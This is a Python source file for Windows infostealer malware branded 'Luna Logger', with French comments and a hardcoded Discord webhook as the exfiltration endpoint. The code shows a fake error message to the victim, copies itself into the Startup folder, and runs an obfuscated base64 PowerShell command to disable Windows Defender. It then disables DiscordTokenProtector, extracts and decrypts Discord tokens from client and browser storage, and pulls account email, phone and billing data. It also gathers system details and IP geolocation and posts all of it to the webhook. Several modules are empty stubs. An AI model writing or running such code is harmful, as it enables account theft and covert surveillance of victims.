import base64
import ctypes
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile

import psutil
import requests
from Crypto.Cipher import AES
from PIL import ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData

# Webhook configuré - À remplacer par votre webhook
VOTRE_WEBHOOK = "https://discord.com/api/webhooks/1473661508142502061/OIAc17Ghq_uxtqHdieIWYx5_STIb5WwpDqspaY6XJ4qrzM6_aorA6RzA2KfPYPfxOxaQ"

# Configuration - Définie ici au lieu d'utiliser une variable non définie
__CONFIG__ = {
    "error": True,
    "startup": True,
    "defender": True,
    "ping": False,
    "pingtype": "Here",
    "roblox": True,
    "browser": True,
    "wifi": True,
    "minecraft": True,
    "backupcodes": True,
    "systeminfo": True,
    "discord": True,
    "anti_spam": False,
    "antidebug_vm": False,
    "injection": False,
    "self_destruct": False
}

# Variables globales
temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.makedirs(temp_path, exist_ok=True)
localappdata = os.getenv("localappdata")


def main(webhook: str):
    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector]
    
    # Configuration des threads optionnels
    if __CONFIG__["error"]:
        threads.append(fakeerror)
    if __CONFIG__["startup"]:
        threads.append(startup)
    if __CONFIG__["defender"]:
        threads.append(disable_defender)

    for func in threads:
        if callable(func):
            process = threading.Thread(target=func, daemon=True)
            process.start()
    
    for t in threading.enumerate():
        try:
            if t != threading.current_thread():
                t.join(timeout=1)
        except RuntimeError:
            continue

    zipup()

    data = {
        "username": "BlueSpider TOOL",
        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
    }

    _file = os.path.join(localappdata, f'BlueSpider-logs-{os.getlogin()}.zip')

    if __CONFIG__["ping"]:
        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
            content = f"@{__CONFIG__['pingtype'].lower()}"
            data.update({"content": content})

    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        if os.path.exists(_file):
            with open(_file, 'rb') as file:
                encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
                requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
    else:
        requests.post(webhook, json=data)

    if __CONFIG__["systeminfo"]:
        PcInfo(webhook)

    if __CONFIG__["discord"]:
        Discord(webhook)

    if __CONFIG__["roblox"]:
        Roblox(webhook)

    if __CONFIG__["minecraft"]:
        MinecraftInfo(webhook)

    if __CONFIG__["systeminfo"]:
        IPInfo(webhook)

    if os.path.exists(_file):
        os.remove(_file)


def Luna(webhook: str):
    if __CONFIG__["anti_spam"]:
        AntiSpam()

    if __CONFIG__["antidebug_vm"]:
        Debug()

    if __CONFIG__["injection"]:
        Injection(webhook)
    
    main(webhook)

    if __CONFIG__["self_destruct"]:
        SelfDestruct()


def fakeerror():
    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)


def startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if hasattr(sys, 'frozen'):
        source_path = sys.executable
    else:
        source_path = sys.argv[0]

    target_path = os.path.join(startup_path, os.path.basename(source_path))
    if not os.path.exists(target_path):
        try:
            copy2(source_path, startup_path)
        except:
            pass


def disable_defender():
    try:
        cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZA==').decode()
        subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
    except:
        pass


def create_temp(_dir: str = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    return path


def killprotector():
    roaming = os.getenv('APPDATA')
    path = os.path.join(roaming, "DiscordTokenProtector")
    config = os.path.join(path, "config.json")

    if not os.path.exists(path):
        return

    for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
        try:
            os.remove(os.path.join(path, process))
        except (FileNotFoundError, PermissionError):
            pass

    if os.path.exists(config):
        try:
            with open(config, "r", errors="ignore") as f:
                item = json.load(f)
        except:
            return
        
        item['auto_start'] = False
        item['auto_start_discord'] = False
        item['integrity'] = False
        
        try:
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
        except:
            pass


def zipup():
    _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
    try:
        with ZipFile(_zipfile, "w", ZIP_DEFLATED) as zipped_file:
            abs_src = os.path.abspath(temp_path)
            for dirname, _, files in os.walk(temp_path):
                for filename in files:
                    absname = os.path.abspath(os.path.join(dirname, filename))
                    arcname = absname[len(abs_src) + 1:]
                    zipped_file.write(absname, arcname)
    except Exception as e:
        print(f"Error creating zip: {e}")


class IPInfo:
    def __init__(self, webhook: str):
        self.get_ip_info(webhook)

    def get_ip_info(self, webhook):
        try:
            # Récupérer l'IP publique
            try:
                ip = requests.get('https://api.ipify.org', timeout=10).text
            except:
                ip = "Inconnue"

            # Récupérer les informations de géolocalisation
            geo_info = self.get_geo_info(ip)
            
            if geo_info:
                data = {
                    "embeds": [
                        {
                            "title": "🌍 Informations de Localisation IP",
                            "color": 3447003,
                            "fields": [
                                {
                                    "name": "📍 Adresse IP",
                                    "value": f"**IP Publique:** `{ip}`",
                                    "inline": False
                                },
                                {
                                    "name": "🗺️ Géolocalisation",
                                    "value": f"""**Pays:** `{geo_info.get('country', 'Inconnu')}`
**Région:** `{geo_info.get('region', 'Inconnue')}`
**Ville:** `{geo_info.get('city', 'Inconnue')}`
**Code Postal:** `{geo_info.get('zip', 'Inconnu')}`""",
                                    "inline": True
                                },
                                {
                                    "name": "📡 Coordonnées",
                                    "value": f"""**Latitude:** `{geo_info.get('lat', 'Inconnue')}`
**Longitude:** `{geo_info.get('lon', 'Inconnue')}`
**Fuseau Horaire:** `{geo_info.get('timezone', 'Inconnu')}`""",
                                    "inline": True
                                },
                                {
                                    "name": "🏢 Fournisseur",
                                    "value": f"""**ISP:** `{geo_info.get('isp', 'Inconnu')}`
**Organisation:** `{geo_info.get('org', 'Inconnue')}`
**ASN:** `{geo_info.get('as', 'Inconnu')}`""",
                                    "inline": False
                                }
                            ],
                            "footer": {"text": "Luna Logger | Created by Smug"},
                            "thumbnail": {"url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}
                        }
                    ],
                    "username": "Luna Logger",
                    "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
                }
            else:
                data = {
                    "embeds": [
                        {
                            "title": "🌍 Informations de Localisation IP",
                            "color": 15158332,
                            "fields": [
                                {
                                    "name": "❌ Erreur",
                                    "value": "Impossible de récupérer les informations de géolocalisation.",
                                    "inline": False
                                },
                                {
                                    "name": "📍 Adresse IP",
                                    "value": f"**IP Publique:** `{ip}`",
                                    "inline": False
                                }
                            ],
                            "footer": {"text": "Luna Logger | Created by Smug"},
                            "thumbnail": {"url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}
                        }
                    ],
                    "username": "Luna Logger",
                    "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
                }

            requests.post(webhook, json=data, timeout=10)
        except Exception as e:
            print(f"IP Info error: {e}")

    def get_geo_info(self, ip):
        try:
            # Essayer plusieurs APIs de géolocalisation
            apis = [
                f"http://ip-api.com/json/{ip}",
                f"https://ipapi.co/{ip}/json/",
                f"http://ipwho.is/{ip}"
            ]
            
            for api_url in apis:
                try:
                    response = requests.get(api_url, timeout=10)
                    if response.status_code == 200:
                        data = response.json()
                        
                        # Adapter selon l'API utilisée
                        if 'ip-api.com' in api_url:
                            return {
                                'country': data.get('country', 'Inconnu'),
                                'region': data.get('regionName', 'Inconnue'),
                                'city': data.get('city', 'Inconnue'),
                                'zip': data.get('zip', 'Inconnu'),
                                'lat': str(data.get('lat', 'Inconnue')),
                                'lon': str(data.get('lon', 'Inconnue')),
                                'timezone': data.get('timezone', 'Inconnu'),
                                'isp': data.get('isp', 'Inconnu'),
                                'org': data.get('org', 'Inconnue'),
                                'as': data.get('as', 'Inconnu')
                            }
                        elif 'ipapi.co' in api_url:
                            return {
                                'country': data.get('country_name', 'Inconnu'),
                                'region': data.get('region', 'Inconnue'),
                                'city': data.get('city', 'Inconnue'),
                                'zip': data.get('postal', 'Inconnu'),
                                'lat': str(data.get('latitude', 'Inconnue')),
                                'lon': str(data.get('longitude', 'Inconnue')),
                                'timezone': data.get('timezone', 'Inconnu'),
                                'isp': data.get('org', 'Inconnu'),
                                'org': data.get('org', 'Inconnue'),
                                'as': data.get('asn', 'Inconnu')
                            }
                        elif 'ipwho.is' in api_url:
                            return {
                                'country': data.get('country', 'Inconnu'),
                                'region': data.get('region', 'Inconnue'),
                                'city': data.get('city', 'Inconnue'),
                                'zip': data.get('postal', 'Inconnu'),
                                'lat': str(data.get('latitude', 'Inconnue')),
                                'lon': str(data.get('longitude', 'Inconnue')),
                                'timezone': data.get('timezone', {}).get('id', 'Inconnu'),
                                'isp': data.get('connection', {}).get('isp', 'Inconnu'),
                                'org': data.get('connection', {}).get('org', 'Inconnue'),
                                'as': data.get('connection', {}).get('asn', 'Inconnu')
                            }
                except:
                    continue
            
            return None
        except:
            return None


class PcInfo:
    def __init__(self, webhook: str):
        self.get_inf(webhook)

    def get_inf(self, webhook):
        try:
            # Get OS info - méthode plus robuste
            try:
                computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True, text=True, timeout=10)
                if computer_os.returncode == 0:
                    lines = [line.strip() for line in computer_os.stdout.split('\n') if line.strip()]
                    computer_os = lines[1] if len(lines) > 1 else "Windows"
                else:
                    computer_os = "Windows"
            except:
                computer_os = "Windows"
            
            # Get CPU info
            try:
                cpu_result = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, timeout=10)
                if cpu_result.returncode == 0:
                    lines = [line.strip() for line in cpu_result.stdout.split('\n') if line.strip()]
                    cpu = lines[1] if len(lines) > 1 else "Unknown CPU"
                else:
                    cpu = "Unknown CPU"
            except:
                cpu = "Unknown CPU"
            
            # Get GPU info
            try:
                gpu_result = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True, text=True, timeout=10)
                if gpu_result.returncode == 0:
                    lines = [line.strip() for line in gpu_result.stdout.split('\n') if line.strip() and line.strip() != 'Name']
                    gpu = ", ".join(lines) if lines else "Unknown GPU"
                else:
                    gpu = "Unknown GPU"
            except:
                gpu = "Unknown GPU"
            
            # Get RAM info
            try:
                ram_result = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True, text=True, timeout=10)
                if ram_result.returncode == 0:
                    lines = [line.strip() for line in ram_result.stdout.split('\n') if line.strip() and line.strip().isdigit()]
                    if lines:
                        ram_bytes = int(lines[0])
                        ram_gb = ram_bytes / (1024**3)
                        ram = f"{ram_gb:.1f} GB"
                    else:
                        ram = "Unknown"
                else:
                    ram = "Unknown"
            except:
                ram = "Unknown"
            
            username = os.getenv("UserName", "Unknown")
            hostname = os.getenv("COMPUTERNAME", "Unknown")
            
            # Get HWID
            try:
                hwid_result = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], capture_output=True, text=True, timeout=10)
                if hwid_result.returncode == 0:
                    lines = [line.strip() for line in hwid_result.stdout.split('\n') if line.strip() and line.strip() != 'UUID']
                    hwid = lines[0] if lines else "Unknown"
                else:
                    hwid = "Unknown"
            except:
                hwid = "Unknown"
            
            # Get IP (locale)
            try:
                ip_local = requests.get('https://api.ipify.org', timeout=10).text
            except:
                ip_local = "Unknown"
            
            # Get MAC address
            try:
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
            except:
                mac = "Unknown"

            data = {
                "embeds": [
                    {
                        "title": "💻 System Information",
                        "color": 5639644,
                        "fields": [
                            {
                                "name": "System Info",
                                "value": f"""**PC Username:** `{username}`
**PC Name:** `{hostname}`
**OS:** `{computer_os}`
**IP:** `{ip_local}`
**MAC:** `{mac}`
**HWID:** `{hwid}`
**CPU:** `{cpu}`
**GPU:** `{gpu}`
**RAM:** `{ram}`"""
                            }
                        ],
                        "footer": {"text": "Luna Logger | Created by Smug"},
                        "thumbnail": {"url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}
                    }
                ],
                "username": "Luna Logger",
                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
            }

            requests.post(webhook, json=data, timeout=10)
        except Exception as e:
            print(f"PC Info error: {e}")


class Discord:
    def __init__(self, webhook: str):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.webhook = webhook

        self.grabTokens()
        self.upload()

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            
            # Recherche des tokens non chiffrés
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                try:
                    with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                        content = file.read()
                        for token in re.findall(self.regex, content):
                            if token and token not in self.tokens:
                                self.tokens.append(token)
                except:
                    pass
            
            # Recherche des tokens chiffrés (Discord)
            if "cord" in name.lower():
                local_state_path = None
                if "discord" in name.lower():
                    local_state_path = self.roaming + '\\discord\\Local State'
                elif "canary" in name.lower():
                    local_state_path = self.roaming + '\\discordcanary\\Local State'
                elif "ptb" in name.lower():
                    local_state_path = self.roaming + '\\discordptb\\Local State'
                
                if local_state_path and os.path.exists(local_state_path):
                    master_key = self.get_master_key(local_state_path)
                    if master_key:
                        for file_name in os.listdir(path):
                            if file_name[-3:] not in ["log", "ldb"]:
                                continue
                            try:
                                with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                                    content = file.read()
                                    for y in re.findall(self.encrypted_regex, content):
                                        try:
                                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                            if token and token not in self.tokens:
                                                self.tokens.append(token)
                                        except:
                                            pass
                            except:
                                pass

    def upload(self):
        if not self.tokens:
            # Aucun token trouvé
            data = {
                "embeds": [
                    {
                        "title": "Discord Info",
                        "color": 16711680,
                        "fields": [
                            {
                                "name": "Aucun token Discord trouvé",
                                "value": "Aucun token Discord valide n'a été trouvé sur ce système."
                            }
                        ],
                        "footer": {"text": "Luna Logger | Created by Smug"},
                        "thumbnail": {"url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}
                    }
                ],
                "username": "Luna Logger",
                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
            }
            requests.post(self.webhook, json=data, timeout=10)
            return

        # Préparer l'embed pour tous les tokens
        embeds = []
        
        for i, token in enumerate(self.tokens):
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token
                }
                
                user_response = requests.get(self.baseurl, headers=headers, timeout=10)
                if user_response.status_code == 200:
                    user = user_response.json()
                    username = user.get('username', 'Inconnu') + '#' + user.get('discriminator', '0000')
                    user_id = user.get('id', 'Inconnu')
                    email = user.get('email', 'Non défini')
                    phone = user.get('phone', 'Non défini')
                    mfa_enabled = user.get('mfa_enabled', False)
                    premium_type = user.get('premium_type', 0)
                    
                    # Get avatar URL
                    avatar_hash = user.get('avatar')
                    avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"  # Default avatar
                    if avatar_hash:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=1024"
                    
                    # Get billing info
                    billing_country = "Non défini"
                    try:
                        billing_response = requests.get(f"{self.baseurl}/billing/payment-sources", headers=headers, timeout=10)
                        if billing_response.status_code == 200:
                            billing_data = billing_response.json()
                            if billing_data and len(billing_data) > 0:
                                billing_country = billing_data[0].get('country', 'Non défini')
                    except:
                        pass
                    
                    # Format premium type
                    nitro_type = "Aucun"
                    if premium_type == 1:
                        nitro_type = "Nitro Classic"
                    elif premium_type == 2:
                        nitro_type = "Nitro Boost"
                    
                    # Format 2FA
                    twofa = "❌" if not mfa_enabled else "✅"
                    
                    # Format billing country with flag
                    country_flags = {
                        "US": "🇺🇸", "GB": "🇬🇧", "FR": "🇫🇷", "DE": "🇩🇪", "ES": "🇪🇸", 
                        "IT": "🇮🇹", "CA": "🇨🇦", "AU": "🇦🇺", "JP": "🇯🇵", "BR": "🇧🇷"
                    }
                    flag = country_flags.get(billing_country.upper(), "🏳️")
                    
                    embed = {
                        "title": f"Discord Info - Compte {i+1}",
                        "color": 5639644,
                        "fields": [
                            {
                                "name": "Informations du compte",
                                "value": f"""**Utilisateur:** `{username}`
**ID:** `{user_id}`
**Email:** `{email}`
**Téléphone:** `{phone}`
**2FA:** {twofa}
**Nitro:** `{nitro_type}`
**Pays de facturation:** `{billing_country} {flag}`
**Token:** `{token}`"""
                            }
                        ],
                        "footer": {"text": "Luna Logger | Created by Smug"},
                        "thumbnail": {"url": avatar_url}
                    }
                    
                    embeds.append(embed)
                    
            except Exception as e:
                print(f"Discord upload error for token {i+1}: {e}")

        # Envoyer tous les embeds en une seule requête
        if embeds:
            data = {
                "embeds": embeds,
                "username": "Luna Logger",
                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
            }
            
            requests.post(self.webhook, json=data, timeout=10)


class Roblox:
    def __init__(self, webhook: str):
        self.webhook = webhook
        self.get_roblox_info()

    def get_roblox_info(self):
        try:
            roblox_data = self.extract_roblox_data()
            if not roblox_data:
                # Aucune donnée Roblox trouvée
                data = {
                    "embeds": [
                        {
                            "title": "Roblox Info",
                            "color": 16711680,
                            "fields": [
                                {
                                    "name": "Aucune donnée Roblox trouvée",
                                    "value": "Aucune information Roblox n'a été trouvée sur ce système."
                                }
                            ],
                            "footer": {"text": "Luna Logger | Created by Smug"},
                            "thumbnail": {"url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}
                        }
                    ],
                    "username": "Luna Logger",
                    "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
                }
            else:
                data = {
                    "embeds": [
                        {
                            "title": "Roblox Info",
                            "color": 5639644,
                            "fields": [
                                {
                                    "name": "Comptes Roblox Trouvés",
                                    "value": roblox_data
                                }
                            ],
                            "footer": {"text": "Luna Logger | Created by Smug"},
                            "thumbnail": {"url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"}
                        }
                    ],
                    "username": "Luna Logger",
                    "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
                }
            
            requests.post(self.webhook, json=data, timeout=10)
        except Exception as e:
            print(f"Roblox info error: {e}")

    def extract_roblox_data(self):
        result = ""
        # À compléter avec votre code Roblox existant
        return result


# Classes pour les autres fonctionnalités
class Wifi:
    def __init__(self):
        pass

class Minecraft:
    def __init__(self):
        pass

class BackupCodes:
    def __init__(self):
        pass

class Browsers:
    def __init__(self):
        pass

def AntiSpam():
    pass

def Debug():
    pass

def Injection(webhook):
    pass

def SelfDestruct():
    pass

def MinecraftInfo(webhook):
    pass


# Point d'entrée
if __name__ == "__main__":
    Luna(VOTRE_WEBHOOK)